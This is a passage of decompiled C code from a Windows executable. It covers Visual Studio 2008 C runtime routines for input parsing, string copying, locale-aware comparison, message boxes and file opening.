            if (((bVar1 == 0x2d) && (bVar11 = (byte)uVar4, bVar11 != 0)) &&
               (bVar2 = pbVar18[1], bVar2 != 0x5d)) {
              if (bVar2 <= bVar11) {
                uVar4 = (uint)bVar2;
                bVar2 = bVar11;
              }
              if ((byte)uVar4 <= bVar2) {
                uVar12 = (uint)(byte)((bVar2 - (byte)uVar4) + 1);
                do {
                  local_28[uVar4 >> 3] = local_28[uVar4 >> 3] | '\x01' << ((byte)uVar4 & 7);
                  uVar4 = uVar4 + 1;
                  uVar12 = uVar12 - 1;
                } while (uVar12 != 0);
              }
              uVar4 = 0;
              pbVar18 = pbVar18 + 2;
            }
            else {
              local_28[bVar1 >> 3] = local_28[bVar1 >> 3] | '\x01' << (bVar1 & 7);
              uVar4 = (uint)bVar1;
              pbVar18 = pbVar18 + 1;
            }
          }
          goto LAB_0041b0b0;
        }
        goto LAB_0041b20d;
      }
LAB_0041acc4:
      iVar7 = local_1b8;
      cVar13 = '\0';
      if (local_18c == 0x2d) {
        local_1a4 = '\x01';
LAB_0041b30e:
        local_198 = local_198 + -1;
        if ((local_198 == 0) && (local_1b8 != 0)) {
          cVar13 = '\x01';
        }
        else {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(local_1b8,local_1a0);
          iVar7 = extraout_ECX_07;
        }
      }
      else if (local_18c == 0x2b) goto LAB_0041b30e;
      if (local_18c == 0x30) {
        local_190 = (undefined4 *)((int)local_190 + 1);
        local_18c = __inc(iVar7,local_1a0);
        if (((char)local_18c == 'x') || ((char)local_18c == 'X')) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX_08,local_1a0);
          if ((local_1b8 != 0) && (local_198 = local_198 + -2, local_198 < 1)) {
            cVar13 = cVar13 + '\x01';
          }
          local_1a8 = 0x78;
        }
        else {
          local_1ac = 1;
          if (local_1a8 == 0x78) {
            local_190 = (undefined4 *)((int)local_190 + -1);
            __un_inc(local_18c,local_1a0);
            local_18c = 0x30;
          }
          else {
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) {
              cVar13 = cVar13 + '\x01';
            }
            local_1a8 = 0x6f;
          }
        }
      }
LAB_0041b4bc:
      if (local_1dc == 0) {
        puVar17 = local_1c4;
        if (cVar13 == '\0') {
          while ((local_1a8 != 0x78 && (local_1a8 != 0x70))) {
            uVar4 = local_18c & 0xff;
            iVar7 = _isdigit(uVar4);
            if (iVar7 == 0) goto LAB_0041b6c9;
            if (local_1a8 == 0x6f) {
              if (0x37 < (int)local_18c) goto LAB_0041b6c9;
              iVar7 = (int)puVar17 << 3;
            }
            else {
              iVar7 = (int)puVar17 * 10;
            }
LAB_0041b68c:
            local_1ac = local_1ac + 1;
            puVar17 = (undefined4 *)(iVar7 + -0x30 + local_18c);
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) goto LAB_0041b6e2;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(uVar4,local_1a0);
          }
          iVar7 = _isxdigit(local_18c & 0xff);
          if (iVar7 != 0) {
            iVar7 = (int)puVar17 << 4;
            uVar4 = local_18c;
            local_18c = __hextodec((byte)local_18c);
            goto LAB_0041b68c;
          }
LAB_0041b6c9:
          local_190 = (undefined4 *)((int)local_190 + -1);
          __un_inc(local_18c,local_1a0);
        }
LAB_0041b6e2:
        if (local_1a4 != '\0') {
          puVar17 = (undefined4 *)-(int)puVar17;
        }
      }
      else {
        if (cVar13 == '\0') {
          while ((local_1a8 != 0x78 && (local_1a8 != 0x70))) {
            uVar4 = local_18c & 0xff;
            iVar7 = _isdigit(uVar4);
            if (iVar7 == 0) goto LAB_0041b5c3;
            if (local_1a8 == 0x6f) {
              if (0x37 < (int)local_18c) goto LAB_0041b5c3;
              lVar20 = CONCAT44(local_1d0._4_4_ << 3 | (uint)local_1d0 >> 0x1d,(uint)local_1d0 << 3)
              ;
            }
            else {
              lVar20 = __allmul((uint)local_1d0,local_1d0._4_4_,10,0);
              uVar4 = extraout_ECX_09;
            }
LAB_0041b576:
            local_1ac = local_1ac + 1;
            local_1d0 = lVar20 + (int)(local_18c - 0x30);
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) goto LAB_0041b5dc;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(uVar4,local_1a0);
          }
          iVar7 = _isxdigit(local_18c & 0xff);
          if (iVar7 != 0) {
            lVar20 = CONCAT44(local_1d0._4_4_ << 4 | (uint)local_1d0 >> 0x1c,(uint)local_1d0 << 4);
            uVar4 = local_18c;
            local_18c = __hextodec((byte)local_18c);
            goto LAB_0041b576;
          }
LAB_0041b5c3:
          local_190 = (undefined4 *)((int)local_190 + -1);
          __un_inc(local_18c,local_1a0);
        }
LAB_0041b5dc:
        puVar17 = local_1c4;
        if (local_1a4 != '\0') {
          local_1d0 = CONCAT44(-(local_1d0._4_4_ + ((uint)local_1d0 != 0)),-(uint)local_1d0);
        }
      }
      if (local_1a8 == 0x46) {
        local_1ac = 0;
      }
      if (local_1ac == 0) goto LAB_0041b812;
      if (local_19a == '\0') {
        local_1c8 = local_1c8 + 1;
LAB_0041b71f:
        if (local_1dc == 0) {
          if (local_199 == '\0') {
            *(short *)local_1c0 = (short)puVar17;
          }
          else {
            *local_1c0 = puVar17;
          }
        }
        else {
          *local_1c0 = (uint)local_1d0;
          local_1c0[1] = local_1d0._4_4_;
        }
      }
      goto LAB_0041b74b;
    }
LAB_0041b76e:
    local_190 = (undefined4 *)((int)local_190 + 1);
    uVar4 = __inc(pvVar5,pFVar21);
    pbVar18 = param_2 + 1;
    local_1bc = pbVar18;
    local_18c = uVar4;
    if (*param_2 == uVar4) {
      uVar12 = uVar4 & 0xff;
      iVar7 = _isleadbyte(uVar12);
      if (iVar7 != 0) {
        local_190 = (undefined4 *)((int)local_190 + 1);
        uVar12 = __inc(uVar12,pFVar21);
        bVar1 = *pbVar18;
        pbVar18 = param_2 + 2;
        local_1bc = pbVar18;
        if (bVar1 == uVar12) {
          local_190 = (undefined4 *)((int)local_190 + -1);
          goto LAB_0041b7c0;
        }
        __un_inc(uVar12,pFVar21);
        __un_inc(uVar4,pFVar21);
        goto LAB_0041b812;
      }
      goto LAB_0041b7c0;
    }
LAB_0041b7f4:
    __un_inc(local_18c,pFVar21);
LAB_0041b812:
    if (local_1d4 == 1) {
      _free(local_1b0);
    }
    if (local_18c == 0xffffffff) {
      if (local_1f0 != '\0') {
        *(uint *)(local_1f4 + 0x70) = *(uint *)(local_1f4 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041b874;
    }
  }
  if (local_1f0 != '\0') {
    *(uint *)(local_1f4 + 0x70) = *(uint *)(local_1f4 + 0x70) & 0xfffffffd;
  }
LAB_0041b874:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
LAB_0041b411:
  local_190 = (undefined4 *)((int)local_190 + -1);
  __un_inc(local_18c,pFVar21);
LAB_0041b420:
  if (local_1c4 == puVar17) goto LAB_0041b812;
  if ((local_19a == '\0') && (local_1c8 = local_1c8 + 1, local_1a8 != 99)) {
    if (local_1a2 == '\0') {
      *(undefined *)local_1c0 = 0;
    }
    else {
      *(undefined2 *)local_1c0 = 0;
    }
  }
LAB_0041b74b:
  local_1a1 = local_1a1 + '\x01';
  pbVar18 = local_1bc + 1;
  local_1bc = pbVar18;
LAB_0041b7c0:
  param_2 = pbVar18;
  if ((local_18c == 0xffffffff) &&
     ((*pbVar18 != 0x25 || (param_2 = local_1bc, local_1bc[1] != 0x6e)))) goto LAB_0041b812;
LAB_0041b7dc:
  bVar1 = *param_2;
  if (bVar1 == 0) goto LAB_0041b812;
  goto LAB_0041a9ef;
}



// Library Function - Single Match
//  __mbsnbicoll_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicoll_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_MaxCount == 0) {
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if ((_Str1 == (uchar *)0x0) || (_Str2 == (uchar *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  if (_MaxCount < 0x80000000) {
    if ((local_14.mbcinfo)->ismbcodepage == 0) {
      iVar2 = __strnicoll_l((char *)_Str1,(char *)_Str2,_MaxCount,_Locale);
    }
    else {
      iVar2 = ___crtCompareStringA
                        (&local_14,*(LPCWSTR *)(local_14.mbcinfo)->mbulinfo,0x1001,(LPCSTR)_Str1,
                         _MaxCount,(LPCSTR)_Str2,_MaxCount,(local_14.mbcinfo)->mbcodepage);
      if (iVar2 == 0) goto LAB_0041b94d;
      iVar2 = iVar2 + -2;
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
LAB_0041b94d:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  return iVar2;
}



// Library Function - Single Match
//  __mbsnbicoll
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicoll(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicoll_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___wtomb_environ
// 
// Library: Visual Studio 2008 Release

int __cdecl ___wtomb_environ(void)

{
  LPCWSTR lpWideCharStr;
  size_t _Count;
  int iVar1;
  LPCWSTR *ppWVar2;
  LPSTR local_8;
  
  local_8 = (LPSTR)0x0;
  lpWideCharStr = *DAT_0042d0bc;
  ppWVar2 = DAT_0042d0bc;
  while( true ) {
    if (lpWideCharStr == (LPCWSTR)0x0) {
      return 0;
    }
    _Count = WideCharToMultiByte(0,0,lpWideCharStr,-1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if ((_Count == 0) || (local_8 = (LPSTR)__calloc_crt(_Count,1), local_8 == (LPSTR)0x0)) break;
    iVar1 = WideCharToMultiByte(0,0,*ppWVar2,-1,local_8,_Count,(LPCSTR)0x0,(LPBOOL)0x0);
    if (iVar1 == 0) {
      _free(local_8);
      return -1;
    }
    iVar1 = ___crtsetenv(&local_8,0);
    if ((iVar1 < 0) && (local_8 != (LPSTR)0x0)) {
      _free(local_8);
      local_8 = (LPSTR)0x0;
    }
    ppWVar2 = ppWVar2 + 1;
    lpWideCharStr = *ppWVar2;
  }
  return -1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0041ba43;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0041ba43:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strnlen
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _strnlen(char *_Str,size_t _MaxCount)

{
  uint uVar1;
  
  uVar1 = 0;
  if (_MaxCount != 0) {
    do {
      if (*_Str == '\0') {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      _Str = _Str + 1;
    } while (uVar1 < _MaxCount);
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041baa6(void)

{
  _DAT_0046eb1c = 0;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
  if (DAT_0042db20 == 0) {
    hModule = LoadLibraryA("USER32.DLL");
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,"MessageBoxA");
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_0042db20 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_0042db24 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_0042db28 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetUserObjectInformationA");
    DAT_0042db30 = __encode_pointer((int)pFVar2);
    if (DAT_0042db30 != 0) {
      pFVar2 = GetProcAddress(hModule,"GetProcessWindowStation");
      DAT_0042db2c = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_0042db2c != iVar1) && (DAT_0042db30 != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_0042db2c);
    pcVar4 = (code *)__decode_pointer(DAT_0042db30);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_0041bbf0;
    }
  }
  if ((((DAT_0042db24 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_0042db24), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_0042db28 != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_0042db28), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_0041bbf0:
  pcVar3 = (code *)__decode_pointer(DAT_0042db20);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0041bc39;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0041bc39:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_0041bcb1:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0041bcc2;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_0041bcb1;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_0041bcc2:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_0042d098;
      DAT_0042d098 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_0042d098;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_0041be58;
      }
    }
    else if (uVar4 != 2) goto LAB_0041be14;
    local_c = 0xc0000000;
  }
LAB_0041be58:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_0041be14;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_0041bf5d;
      if (uVar4 != 0x300) goto LAB_0041be14;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_0041bf5d:
        local_18 = 5;
        goto LAB_0041bf0c;
      }
      if (uVar4 != 0x700) {
LAB_0041be14:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_0041bf0c:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_0042d0a4 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_0041c025;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_0041c031;
    }
    pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0041c025;
  }
LAB_0041c031:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0041c025;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_0041c3a6;
    if ((param_3 & 2) == 0) goto LAB_0041c16c;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_0041c16c;
    }
    else {
      local_28 = 0;
      iVar12 = __read_nolock(*in_EAX,&local_28,1);
      if ((((iVar12 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_0041c16c;
    }
LAB_0041c11e:
    __close_nolock(*in_EAX);
    goto LAB_0041c025;
  }
LAB_0041c16c:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_0041c1db;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_0041c1db:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_0041c3a6;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_0041c240;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_0041c30c;
          }
LAB_0041c237:
          if (local_18 != 5) goto LAB_0041c3a6;
        }
LAB_0041c240:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_0041c3a6;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_0041c11e;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_0041c237;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_0041c11e;
                goto LAB_0041c291;
              }
            }
            goto LAB_0041c240;
          }
          goto LAB_0041c3a6;
        }
LAB_0041c291:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_0041c11e;
        if (iVar12 == 2) {
LAB_0041c31a:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_0041c11e;
            local_6 = 2;
            goto LAB_0041c3a6;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_0041c3a6;
          }
          goto LAB_0041c31a;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_0041c30c:
        if (uVar4 == 0xffffffff) goto LAB_0041c11e;
      }
    }
  }
LAB_0041c3a6:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_0046eb40)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
